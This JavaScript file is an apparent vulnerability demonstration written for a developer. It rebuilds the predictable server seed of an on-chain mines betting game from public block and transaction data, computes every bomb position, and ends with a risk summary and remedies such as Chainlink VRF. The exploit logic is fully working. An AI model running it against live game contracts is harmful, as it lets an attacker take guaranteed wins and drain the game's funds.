// ATTACK DEMONSTRATION - How to reconstruct server seeds from transaction data
// This is for educational purposes to show the vulnerability

const { ethers } = require('ethers');

// Your actual transaction data
const transactionData = {
    blockNumber: 25658920,
    blockHash: "0x7f34fb8bee62e3c3c0b63e9d7b13dbe234fff4483561200a8dc4935f0fa1e8bc",
    timestamp: 1752183218,
    from: "0x9d2aa2571da4fb680ecced0f18192a90d9757952", // msg.sender
    to: "0xd51f5ea400d979768c662a880ca62d0dfc87e2df",   // contract
    value: "250000000000000000",                          // 0.25 ETH bet
    gameId: "0x2aef0d814adc1b59374716d523ba3a9308a2ffbce5c26ae5acd109e31ef21946",
    gasUsed: "500000",
    gasPrice: "62400000000"
};

// RPC endpoint to get blockchain data
const RPC_URL = 'https://testnet-rpc.monad.xyz';

async function demonstrateServerSeedReconstruction() {
    console.log('🔴 SERVER SEED RECONSTRUCTION ATTACK DEMO');
    console.log('==========================================\n');
    
    const provider = new ethers.JsonRpcProvider(RPC_URL);
    
    try {
        // Step 1: Get block data for prevrandao
        console.log('📡 Step 1: Fetching block data...');
        const block = await provider.getBlock(transactionData.blockNumber);
        const blockPrevrandao = block.mixHash; // This is block.prevrandao
        
        console.log('✅ Block timestamp:', transactionData.timestamp);
        console.log('✅ Block prevrandao:', blockPrevrandao);
        console.log('✅ msg.sender:', transactionData.from);
        console.log('✅ gameId:', transactionData.gameId);
        
        // Step 2: Calculate contract balance at that moment
        console.log('\n💰 Step 2: Calculating contract balance...');
        
        // Get balance before the transaction
        const balanceBeforeTx = await provider.getBalance(
            transactionData.to, 
            transactionData.blockNumber - 1
        );
        
        // Contract balance during server seed generation = balance before + bet amount
        const balanceDuringExecution = balanceBeforeTx + BigInt(transactionData.value);
        
        console.log('✅ Balance before tx:', ethers.formatEther(balanceBeforeTx));
        console.log('✅ Bet amount:', ethers.formatEther(transactionData.value));
        console.log('✅ Balance during execution:', ethers.formatEther(balanceDuringExecution));
        
        // Step 3: Reconstruct server seed using same formula
        console.log('\n🔓 Step 3: Reconstructing server seed...');
        
        const reconstructedServerSeed = ethers.keccak256(
            ethers.solidityPacked(
                ['uint256', 'bytes32', 'address', 'bytes32', 'uint256'],
                [
                    transactionData.timestamp,     // block.timestamp
                    blockPrevrandao,              // block.prevrandao
                    transactionData.from,         // msg.sender
                    transactionData.gameId,       // gameId
                    balanceDuringExecution        // address(this).balance
                ]
            )
        );
        
        console.log('🚨 RECONSTRUCTED SERVER SEED:', reconstructedServerSeed);
        
        // Step 4: Demonstrate what attacker can do with this
        console.log('\n💀 Step 4: What attacker can do...');
        
        // Simulate client seed (attacker would try different values)
        const clientSeed = "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef";
        
        // Calculate combined seed
        const combinedSeed = ethers.keccak256(
            ethers.concat([
                ethers.toBeArray(clientSeed),
                ethers.toBeArray(reconstructedServerSeed)
            ])
        );
        
        console.log('🎯 Combined seed:', combinedSeed);
        
        // Calculate bomb positions (using same algorithm as game)
        const bombPositions = calculateBombPositions(combinedSeed, 0); // normal difficulty
        const bombIndices = bombPositions.map((isBomb, index) => isBomb ? index : -1)
                                         .filter(index => index !== -1);
        
        console.log('💣 Bomb positions:', bombIndices);
        console.log('💎 Safe positions:', 
            Array.from({length: 36}, (_, i) => i)
                 .filter(i => !bombPositions[i])
                 .slice(0, 10) // Show first 10 safe positions
        );
        
        console.log('\n🔥 ATTACK RESULT:');
        console.log('- Attacker knows ALL bomb positions');
        console.log('- Attacker can click only safe tiles');
        console.log('- Attacker has guaranteed win');
        console.log('- Game security is COMPROMISED');
        
    } catch (error) {
        console.error('❌ Error during reconstruction:', error.message);
        console.log('ℹ️  This might be due to RPC limitations or block data availability');
    }
}

// Bomb position calculation (same as in your game)
function calculateBombPositions(seed, difficulty) {
    const numBombs = difficulty === 1 ? 12 : 9;
    const bombPositions = new Array(36).fill(false);
    
    let bombsPlaced = 0;
    for (let i = 0; bombsPlaced < numBombs; i++) {
        const positionHash = ethers.keccak256(
            ethers.concat([
                ethers.toBeArray(seed),
                ethers.toBeArray(i)
            ])
        );
        const position = parseInt(positionHash.slice(-2), 16) % 36;
        
        if (!bombPositions[position]) {
            bombPositions[position] = true;
            bombsPlaced++;
        }
    }
    
    return bombPositions;
}

// Show attack feasibility analysis
function analyzeAttackFeasibility() {
    console.log('\n📊 ATTACK FEASIBILITY ANALYSIS');
    console.log('================================');
    
    console.log('🔴 HIGH RISK FACTORS:');
    console.log('- All server seed components are public');
    console.log('- Reconstruction requires only basic blockchain knowledge');
    console.log('- Attack can be automated with simple scripts');
    console.log('- No rate limiting or attack detection');
    
    console.log('\n🟡 MEDIUM RISK FACTORS:');
    console.log('- Requires understanding of Solidity encoding');
    console.log('- Need to monitor transactions and extract data');
    console.log('- Economic viability depends on game stakes');
    
    console.log('\n🟢 LOW RISK FACTORS:');
    console.log('- Commitment system provides some protection');
    console.log('- Attack requires technical blockchain expertise');
    console.log('- Economic barriers may deter casual attackers');
    
    console.log('\n💡 RECOMMENDATIONS:');
    console.log('1. Add Chainlink VRF for production use');
    console.log('2. Implement enhanced entropy sources');
    console.log('3. Add monitoring for suspicious patterns');
    console.log('4. Consider time delays for additional security');
}

// Run the demonstration
console.log('🚨 This demonstration shows how your current server seed can be reconstructed');
console.log('🚨 This is for educational purposes to understand the vulnerability\n');

demonstrateServerSeedReconstruction()
    .then(() => analyzeAttackFeasibility())
    .catch(console.error); 